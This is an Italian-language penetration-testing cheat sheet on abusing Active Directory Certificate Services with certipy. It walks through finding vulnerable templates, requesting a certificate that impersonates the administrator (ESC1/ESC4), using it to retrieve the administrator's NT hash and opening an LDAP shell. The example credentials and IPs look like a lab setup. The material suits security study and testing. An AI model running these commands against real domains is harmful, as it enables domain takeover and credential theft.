# AD CS Certificates (Windows)

| Caratteristica | Dettaglio |
| :--- | :--- |
| **Tool necessari** | `certipy`, `NetExec` (nxc) |
| **SO Target** | Windows (Active Directory Certificate Services) |
| **Quando effettuare** | Quando il dominio utilizza AD CS per la gestione dei certificati |
| **Info Utili** | Exploiting di template vulnerabili (ESC1-ESC8) per Privilege Escalation |

### Ricerca Vulnerabilità
Identificare se ci sono template vulnerabili contrassegnati con `[!] Vulnerabilities`.

**Comando Generico (Certipy):**
```bash
certipy ad find -u '<USER>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -target <DOMAIN>
```
*Esempio:*
```bash
certipy ad find -u 'alice' -p 'Pass123' -dc-ip '10.10.10.180' -target eh.local
```

### Richiesta Certificato (ESC4 / ESC1)
Se un template permette di specificare un `Subject Alternative Name` (SAN) o ha permessi di scrittura.

**Richiesta Certificato:**
```bash
certipy req -u '<USER>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -target '<CA_HOSTNAME>' -ca '<CA_NAME>' -template '<VULN_TEMPLATE>' -upn 'administrator@<DOMAIN>' -sid '<ADMIN_SID>'
```

### Autenticazione con Certificato
Una volta ottenuto il file `.pfx`, è possibile richiedere l'hash NT dell'utente target (es. Administrator).

**Autenticazione:**
```bash
certipy auth -pfx '<CERT_FILE>.pfx' -dc-ip '<DC_IP>'
```
*Esempio:*
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.180
```

**Accesso LDAP Shell:**
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.180 -ldap-shell
```

### URL Fondamentali
- [Certipy GitHub](https://github.com/ly4k/Certipy)
- [Certipy Wiki - ESC4 Privilege Escalation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [SpecterOps - Certified Pre-Owned (Whitepaper)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Hacktricks AD CS](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-cs-active-directory-certificate-services.html)
